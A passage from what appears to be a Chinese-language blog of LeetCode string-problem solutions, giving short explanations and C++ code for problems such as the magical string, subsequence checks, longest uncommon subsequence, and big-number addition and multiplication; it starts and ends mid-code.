class="hljs-string">&#x27;.&#x27;</span>; i++) &#123;<br>                x = x * <span class="hljs-number">10</span> + version1[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125;<br>            i++;<br><br>            <span class="hljs-type">long</span> <span class="hljs-type">long</span> y = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (; j &lt; n &amp;&amp; version2[j] != <span class="hljs-string">&#x27;.&#x27;</span>; j++) &#123;<br>                y = y * <span class="hljs-number">10</span> + version2[j] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125;<br>            j++;<br><br>            <span class="hljs-keyword">if</span> (x != y) &#123;<br>                <span class="hljs-keyword">return</span> x &gt; y ? <span class="hljs-number">1</span> : <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="神奇字符串">神奇字符串</h2><blockquote><p>按照定义来构造长度为 n 的字符串 s，然后统计 s 中 1的个数即可。那么如何通过现有的开头字符串来构造剩下的字符串呢——我们可以初始化字符串s=122，用指针 i 确定下一个数字（'1' 或'2'）应被添加多少次，它指向当前字符串中决定下一序列个数的位置；用指针 j来指向字符串中下一个数字应插入的位置，此时i=2，j=3。因为相邻组中的数字一定不会相同，所以我们可以通过 j的前一个位置的数来判断当前需要填入的组中的数字。又因为每组的大小只为 1或者 2，这保证了 j&gt;i 在构造的过程中一定成立，即在指针 j处填入组时一定能确定此时需要填入的组的大小。这样我们就可以不断往下进行构造直到字符串长度到达n。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">magicalString</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-function">string <span class="hljs-title">s</span><span class="hljs-params">(n, <span class="hljs-string">&#x27;0&#x27;</span>)</span></span>;<br>        s[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;1&#x27;</span>, s[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;2&#x27;</span>, s[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;2&#x27;</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">3</span>;<br><br>        <span class="hljs-keyword">while</span> (j &lt; n) &#123;<br>            <span class="hljs-type">int</span> size = s[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            <span class="hljs-type">int</span> num = <span class="hljs-number">3</span> - (s[j - <span class="hljs-number">1</span>] - <span class="hljs-string">&#x27;0&#x27;</span>);<br>            <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span> &amp;&amp; j &lt; n) &#123;<br>                s[j] = num + <span class="hljs-string">&#x27;0&#x27;</span>;<br>                <span class="hljs-keyword">if</span> (num == <span class="hljs-number">1</span>) &#123;<br>                    ans++;<br>                &#125;<br>                j++;<br>                size--;<br>            &#125;<br>            i++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="子序列">8. 子序列</h1><h2 id="判断子序列">判断子序列</h2><blockquote><p>只要能找到任意一种 <em>s</em> 在 <em>t</em> 中出现的方式，即可认为<em>s</em> 是 <em>t</em>的子序列。而当我们从前往后匹配，可以发现每次贪心地匹配靠前的字符是最优决策。这样，我们初始化两个指针i 和 j，分别指向 s 和 t 的初始位置。每次贪心地匹配，匹配成功则 i 和 j同时右移，匹配 s 的下一个位置，匹配失败则 j 右移，i 不变，尝试用 t的下一个字符匹配 s。最终如果 i 移动到 s 的末尾，就说明 s 是 t的子序列。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSubsequence</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = s.<span class="hljs-built_in">length</span>(), n = t.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (i &lt; m &amp;&amp; j &lt; n) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == t[j]) &#123;<br>                i++;<br>            &#125;<br>            j++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> i == m;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2id="通过删除字母匹配到字典里最长单词">通过删除字母匹配到字典里最长单词</h2><blockquote><p>第 1 个问题实际上就是判断 <em>t</em> 是否是 <em>s</em> 的子序列。第 2个问题可以通过遍历 <em>dictionary</em>中的字符串，并维护当前长度最长且字典序最小的字符串来找到。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// s是否是t的字串</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSubsequence</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = s.<span class="hljs-built_in">length</span>(), n = t.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (i &lt; m &amp;&amp; j &lt; n) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == t[j]) &#123;<br>                i++;<br>            &#125;<br>            j++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> i == m;<br>    &#125;<br><br>    <span class="hljs-function">string <span class="hljs-title">findLongestWord</span><span class="hljs-params">(string s, vector&lt;string&gt;&amp; dictionary)</span> </span>&#123;<br>        <span class="hljs-comment">// 排序的规则是首先按照字符串的长度从大到小排列，如果长度相同，则按字典顺序排列。</span><br>        <span class="hljs-built_in">sort</span>(dictionary.<span class="hljs-built_in">begin</span>(), dictionary.<span class="hljs-built_in">end</span>(), [](string&amp; a, string&amp; b) &#123;<br>            <span class="hljs-keyword">if</span> (a.<span class="hljs-built_in">size</span>() == b.<span class="hljs-built_in">size</span>())<br>                <span class="hljs-keyword">return</span> a &lt; b;<br>            <span class="hljs-keyword">return</span> a.<span class="hljs-built_in">size</span>() &gt; b.<span class="hljs-built_in">size</span>();<br>        &#125;);<br><br>        <span class="hljs-keyword">for</span> (string t : dictionary) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isSubsequence</span>(t, s)) &#123;<br>                <span class="hljs-keyword">return</span> t;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最长特殊序列-i">最长特殊序列 I</h2><blockquote><p>字符串的子序列的长度不会超过该字符串的长度。若子序列的长度等于字符串的长度，那么子序列就是该字符串。若两字符串不相同，那么我们可以选择较长的字符串作为最长特殊序列，显然它不会是较短的字符串的子序列。特别地，当两字符串长度相同时（但不是同一字符串），我们仍然可以选择其中的一个字符串作为最长特殊序列，它不会是另一个字符串的子序列。若两字符串相同，那么任一字符串的子序列均会出现在两个字符串中，此时应返回−1。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findLUSlength</span><span class="hljs-params">(string a, string b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a != b ? <span class="hljs-built_in">max</span>(a.<span class="hljs-built_in">length</span>(), b.<span class="hljs-built_in">length</span>()) : <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最长特殊序列-ii">最长特殊序列 II</h2><blockquote><p>对每个字符串s 判断其是否为其它字符串的子串即可</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// s是否是t的字串</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSubsequence</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>(), m = t.<span class="hljs-built_in">length</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; n &amp;&amp; j &lt; m) &#123;<br>            <span class="hljs-keyword">if</span> (s[i] == t[j]) &#123;<br>                i++;<br>            &#125;<br>            j++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> i == n;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findLUSlength</span><span class="hljs-params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;<br>        <span class="hljs-comment">//按照长度从大到小排序</span><br>         <span class="hljs-built_in">sort</span>(strs.<span class="hljs-built_in">begin</span>(),strs.<span class="hljs-built_in">end</span>(),[](string a, string b)&#123; <br>            <span class="hljs-keyword">return</span> a.<span class="hljs-built_in">size</span>()&gt;b.<span class="hljs-built_in">size</span>();<br>        &#125;);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; strs.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            <span class="hljs-type">bool</span> isSub = <span class="hljs-literal">false</span>;<br>            <span class="hljs-comment">// 关键点：小于等于</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; strs.<span class="hljs-built_in">size</span>()&amp;&amp;strs[i].<span class="hljs-built_in">size</span>() &lt;= strs[j].<span class="hljs-built_in">size</span>(); j++)&#123;<br>                <span class="hljs-keyword">if</span>(i!=j&amp;&amp;<span class="hljs-built_in">isSubsequence</span>(strs[i],strs[j]))&#123;<br>                    isSub = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!isSub) <span class="hljs-keyword">return</span> strs[i].<span class="hljs-built_in">size</span>();<span class="hljs-comment">//i不是任何串的子串 则为特殊序列 直接返回即可 </span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="高精度运算">9. 高精度运算</h1><h2 id="加一">加一</h2><blockquote><p>对数组 digits 进行一次逆序遍历，找出第一个不为 9的元素，将其加一并将后续所有元素置零即可。如果 digits 的所有元素都是9，例如 [9,9,9,9,9]，那么答案为 [1,0,0,0,0,0]。我们只需要构造一个长度比digits 多 1 的新数组，将首元素置为 1，其余元素置为 0 即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">plusOne</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; digits)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = digits.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> index = n - <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">while</span> (index &gt;= <span class="hljs-number">0</span> &amp;&amp; digits[index] == <span class="hljs-number">9</span>) &#123;<br>            digits[index] = <span class="hljs-number">0</span>;<br>            index--;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;<br>            digits[index]++;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            digits.<span class="hljs-built_in">insert</span>(digits.<span class="hljs-built_in">begin</span>(), <span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> digits;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="二进制求和">二进制求和</h2><blockquote><p>借鉴「列竖式」的方法，末尾对齐，逐位相加。在十进制的计算中「逢十进一」，二进制中我们需要「逢二进一」。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">addBinary</span><span class="hljs-params">(string a, string b)</span> </span>&#123;<br>        string ans;<br>        <span class="hljs-built_in">reverse</span>(a.<span class="hljs-built_in">begin</span>(), a.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-built_in">reverse</span>(b.<span class="hljs-built_in">begin</span>(), b.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-type">int</span> n = <span class="hljs-built_in">max</span>(a.<span class="hljs-built_in">size</span>(), b.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i &lt; a.<span class="hljs-built_in">size</span>()) &#123;<br>                carry += a[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i &lt; b.<span class="hljs-built_in">size</span>()) &#123;<br>                carry += b[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125;<br>            ans.<span class="hljs-built_in">push_back</span>((carry % <span class="hljs-number">2</span>) ? <span class="hljs-string">&#x27;1&#x27;</span> : <span class="hljs-string">&#x27;0&#x27;</span>);<br>            carry /= <span class="hljs-number">2</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (carry) &#123;<br>           ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="字符串相加">字符串相加</h2><blockquote><p>对两个大整数模拟「竖式加法」的过程。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">addStrings</span><span class="hljs-params">(string num1, string num2)</span> </span>&#123;<br>        <span class="hljs-type">int</span> i = num1.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>, j = num2.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>;<br>        string ans;<br><br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> || j &gt;= <span class="hljs-number">0</span> || carry) &#123;<br>            <span class="hljs-type">int</span> x = (i &gt;= <span class="hljs-number">0</span>) ? num1[i] - <span class="hljs-string">&#x27;0&#x27;</span> : <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> y = (j &gt;= <span class="hljs-number">0</span>) ? num2[j] - <span class="hljs-string">&#x27;0&#x27;</span> : <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> sum = x + y + carry;<br>            ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;0&#x27;</span> + sum % <span class="hljs-number">10</span>);<br>            carry = sum / <span class="hljs-number">10</span>;<br>            i--;<br>            j--;<br>        &#125;<br><br>        <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="字符串相乘">字符串相乘</h2><blockquote><p>从右往左遍历乘数，将乘数的每一位与被乘数相乘得到对应的结果，再将每次得到的结果累加，整个过程中涉及到较多字符串相加的操作。如果使用数组代替字符串存储结果，则可以减少对字符串的操作。令m 和 n 分别表示 num 1和 num 2的长度，并且它们均不为 0，则 num 1和 num2的乘积的长度为 m+n−1 或 m+n。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">multiply</span><span class="hljs-params">(string num1, string num2)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num1 == <span class="hljs-string">&quot;0&quot;</span> || num2 == <span class="hljs-string">&quot;0&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> m = num1.<span class="hljs-built_in">size</span>(), n = num2.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ansArr</span><span class="hljs-params">(m + n)</span></span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-type">int</span> x = num1[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = n - <span class="hljs-number">1</span>; j &gt;= <span class="hljs-number">0</span>; j--) &#123;<br>                <span class="hljs-type">int</span> y = num2[j] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                ansArr[i + j + <span class="hljs-number">1</span>] += x * y;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = m + n - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>            ansArr[i - <span class="hljs-number">1</span>] += ansArr[i] / <span class="hljs-number">10</span>;<br>            ansArr[i] %= <span class="hljs-number">10</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> index = (ansArr[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>        string ans;<br>        <span class="hljs-keyword">while</span> (index &lt; m + n) &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;0&#x27;</span> + ansArr[index]);<br>            index++;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="累加数">累加数</h2><blockquote><p>一个累加序列，当它的第一个数字和第二个数字以及总长度确定后，这整个累加序列也就确定了。根据这个性质，我们可以穷举累加序列的第一个数字和第二个数字的所有可能性，对每个可能性，进行一次合法性的判断。当出现一次合法的累加序列后，即可返回true。当所有可能性都遍历完仍无法找到一个合法的累加序列时，返回false。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isAdditiveNumber</span><span class="hljs-params">(string num)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = num.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> secondStart = <span class="hljs-number">1</span>; secondStart &lt; n - <span class="hljs-number">1</span>; secondStart++) &#123;<br>            <span class="hljs-keyword">if</span> (num[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; secondStart != <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> secondEnd = secondStart; secondEnd &lt; n - <span class="hljs-number">1</span>; secondEnd++) &#123;<br>                <span class="hljs-keyword">if</span> (num[secondStart] == <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; secondStart != secondEnd) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">valid</span>(secondStart, secondEnd, num)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">valid</span><span class="hljs-params">(<span class="hljs-type">int</span> secondStart, <span class="hljs-type">int</span> secondEnd, string num)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = num.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> firstStart = <span class="hljs-number">0</span>, firstEnd = secondStart - <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">while</span> (secondEnd &lt;= n - <span class="hljs-number">1</span>) &#123;<br>            string third =<br>                <span class="hljs-built_in">stringAdd</span>(num, firstStart, firstEnd, secondStart, secondEnd);<br>            <span class="hljs-type">int</span> thirdStart = secondEnd + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">int</span> thirdEnd = secondEnd + third.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">if</span> (thirdEnd &gt;= n ||<br>                num.<span class="hljs-built_in">substr</span>(thirdStart, thirdEnd - thirdStart + <span class="hljs-number">1</span>) != third) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (thirdEnd == n - <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            firstStart = secondStart;<br>            firstEnd = secondEnd;<br>            secondStart = thirdStart;<br>            secondEnd = thirdEnd;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function">string <span class="hljs-title">stringAdd</span><span class="hljs-params">(string s, <span class="hljs-type">int</span> firstStart, <span class="hljs-type">int</span> firstEnd, <span class="hljs-type">int</span> secondStart,</span></span><br><span class="hljs-params"><span class="hljs-function">                     <span class="hljs-type">int</span> 